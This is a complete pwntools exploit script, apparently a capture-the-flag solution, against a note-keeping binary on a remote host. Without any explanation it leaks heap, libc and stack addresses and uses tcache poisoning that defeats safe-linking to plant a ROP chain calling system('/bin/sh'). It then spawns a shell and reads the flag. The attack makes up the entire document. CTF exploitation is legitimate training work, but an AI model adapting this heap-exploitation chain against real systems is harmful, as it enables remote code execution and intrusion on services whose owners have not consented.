from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

script = '''
'''

def register(name, username, password):
    p.sendlineafter(b"choice: ", b"1")
    p.sendlineafter(b"full name: ", name)
    p.sendlineafter(b"username: ", username)
    p.sendlineafter(b"password: ", password)

def login(username, password):
    p.sendlineafter(b"choice: ", b"2")
    p.sendlineafter(b"username: ", username)
    p.sendlineafter(b"password: ", password)

def logout():
    p.sendlineafter(b"choice: ", b"3")
    
def note():
    p.sendlineafter(b"choice: ", b"4")

def profile():
    p.sendlineafter(b"choice: ", b"5")

def view_profile():
    p.sendlineafter(b"choice: ", b"1")

def edit_profile(v2, data):
    p.sendlineafter(b"choice: ", b"2")
    if(v2 == 'name'):
        p.sendlineafter(b"choice: ", b"1")
        p.sendlineafter(b"name: ", data)
        
    elif(v2 == 'pass'):
        p.sendlineafter(b"choice: ", b"2")
        p.sendlineafter(b"password: ", data)
    else:
        p.sendlineafter(b"choice: ", b"3")

def add_note(title, content):
    p.sendlineafter(b"choice: ", b"1")
    p.sendlineafter(b"title: ", title)
    p.sendlineafter(b"content: ", content)

def view_note():
    p.sendlineafter(b"choice: ", b"2")

def edit_note(title, new_content):
    p.sendlineafter(b"choice: ", b"3")
    p.sendlineafter(b"edit: ", title)
    p.sendlineafter(b"content: ", new_content)

def delete_note(title):
    p.sendlineafter(b"choice: ", b"4")
    p.sendlineafter(b"delete: ", title)

def back_note():
    p.sendlineafter(b"choice: ", b"5")

p = remote("10.8.0.1", 5001)
#p = process("./chall_patched")
#p = gdb.debug("./chall_patched", gdbscript = script)

register(b"a", b"a", b"a")
login(b"a", b"a")
note()
add_note(b"A", b"A")
back_note()
logout()

register(b"b", b"a", b"b")
login(b"a", b"b")
note()
for i in range(31):
    add_note(f"note{i}".encode(), f"note{i}".encode())
back_note()
logout()

login(b"a", b"a")
note()
view_note()
p.recvuntil(b"Title: ")
heap_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x2ae0
print(hex(heap_base))
for i in range(30, 22, -1):
    delete_note(f"note{i}".encode())

edit_note(p64(heap_base + 0x2ae0), b"A" * 0x5 + b"\x00" * 0x3 + p64(0) + b"\x00" * 0x10 + p64(heap_base + 0x3450))
view_note()
p.recvuntil(b"Title: AAAAAContent: ")
libc_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x203b20
print(hex(libc_base))

__environ = libc_base + libc.symbols['__environ']
edit_note(p64(heap_base + 0x2ae0), b"A" * 0x5 + b"\x00" * 0x3 + p64(0) + b"\x00" * 0x10 + p64(__environ))
view_note()
p.recvuntil(b"Title: AAAAAContent: ")
stack_leak = u64(p.recv(6).ljust(8, b"\x00"))
print(hex(stack_leak))
edit_note(p64(heap_base + 0x2ae0), b"A" * 0x5 + b"\x00" * 0x3 + p64(0) + b"\x00" * 0x10 + p64(heap_base + 0x35a0))
target = ((stack_leak - 0x198) ^ (heap_base + 0x35a0) >> 12)
edit_note(b"A" * 0x5 + b"\x00", p64(target))
back_note()
logout()

login(b"a", b"b")
note()
pop_rdi = libc_base + 0x000000000010f75b
ret = pop_rdi + 1
system = libc_base + libc.symbols['system']
binsh = libc_base + list(libc.search(b"/bin/sh\x00"))[0]
add_note(b"notee", b"A" * 2)
add_note(b"noteee", p64(0) + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system))

p.sendline(b"cat flag.txt")

p.interactive()
#BKSEC{qu1t3_s1mpl3_t0_3xp1oit_r1ght?}